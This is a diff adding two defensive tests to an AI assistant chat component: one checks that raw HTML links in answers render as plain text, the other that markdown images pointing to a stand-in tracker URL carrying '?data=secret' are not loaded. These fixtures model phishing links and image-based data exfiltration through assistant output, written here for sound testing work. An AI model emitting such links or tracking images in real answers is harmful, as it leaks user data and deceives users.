@@ -110,6 +110,23 @@ describe('AssistantMessage', () => {
         open.mockRestore();
     });
 
+    it('shows raw HTML as text so links in it cannot skip the confirmation', () => {
+        const message = assistantMessage({ content: 'Click <a href="https://login.example.net/reset">Fix it</a> now.' });
+
+        const { container } = render(AssistantMessage, { props: { message } });
+
+        expect(container.querySelector('a[href="https://login.example.net/reset"]')).toBeNull();
+        expect(screen.getByLabelText('Exie').textContent).toContain('<a href="https://login.example.net/reset">Fix it</a>');
+    });
+
+    it('does not load remote images from answers', () => {
+        const message = assistantMessage({ content: 'Chart: ![usage](https://tracker.example.net/pixel.png?data=secret)' });
+
+        const { container } = render(AssistantMessage, { props: { message } });
+
+        expect(container.querySelector('img[src^="https://tracker.example.net"]')).toBeNull();
+    });
+
     it('shows thinking before anything has streamed', () => {
         render(AssistantMessage, { props: { isStreaming: true, message: assistantMessage() } });
 
